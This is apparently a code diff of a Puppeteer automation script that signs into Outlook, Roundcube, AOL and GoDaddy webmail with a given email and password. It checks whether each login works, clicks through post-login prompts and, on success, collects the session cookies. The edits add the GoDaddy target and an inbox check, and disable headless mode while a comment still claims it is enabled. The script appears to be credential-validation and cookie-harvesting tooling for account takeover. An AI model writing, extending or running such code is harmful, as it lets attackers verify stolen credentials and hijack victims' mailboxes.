@@ -20,6 +20,7 @@ const platformUrls = {
   outlook: "https://login.microsoftonline.com/",
   roundcube: "https://your-roundcube-url.com/",
   aol: "https://login.aol.com/",
+  godaddy: "https://sso.secureserver.net/?app=email&realm=pass",
 };
 
 const platformSelectors = {
@@ -40,6 +41,7 @@ const platformSelectors = {
     loginFailed: "//*[contains(text(), 'Your account or password is incorrect')]",
     confirmButton: "input[value='Confirm']",
     yesButton: "#acceptButton",
+    inboxLoaded: "div[role='main']", // Selector for an element present in the inbox
   },
   roundcube: {
     input: "input[name='user']",
@@ -100,7 +102,7 @@ async function checkAccountAccess(email, password) {
       executablePath: isDev
         ? localExecutablePath
         : await chromium.executablePath(remoteExecutablePath),
-      headless: true, // Ensure headless mode is enabled
+      headless: false, // Ensure headless mode is enabled
       debuggingPort: isDev ? 9222 : undefined,
     });
 
@@ -110,7 +112,7 @@ async function checkAccountAccess(email, password) {
 
     await page.goto(platformUrls[platform], { waitUntil: "networkidle2", timeout: 60000 });
 
-    const { input, nextButton, passwordInput, passwordNextButton, errorMessage, loginFailed, confirmButton, yesButton } = platformSelectors[platform];
+    const { input, nextButton, passwordInput, passwordNextButton, errorMessage, loginFailed, confirmButton, yesButton, inboxLoaded } = platformSelectors[platform];
 
     // Enter email
     await page.waitForSelector(input);
@@ -161,18 +163,18 @@ async function checkAccountAccess(email, password) {
     // Handle additional modals
     if (accountAccess) {
       try {
-        await page.waitForSelector(confirmButton, { timeout: 5000 });
-        await page.click(confirmButton);
+        // Press Tab once and then Enter to click the modal button
+        //await page.keyboard.press('Tab');
+        await page.keyboard.press('Enter');
+        
+        // Wait for navigation to complete
+        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 });
       } catch (e) {
-        console.log('Confirm button not found');
+        console.log('Error pressing Tab and Enter: ', e.message);
       }
 
-      try {
-        await page.waitForSelector(yesButton, { timeout: 5000 });
-        await page.click(yesButton);
-      } catch (e) {
-        console.log('Yes button not found');
-      }
+      // Wait for the inbox page to load
+      await page.waitForSelector(inboxLoaded, { waitUntil: 'networkidle2', timeout: 60000 });
 
       // Fetch cookies if login is successful
       const browserCookies = await page.cookies();
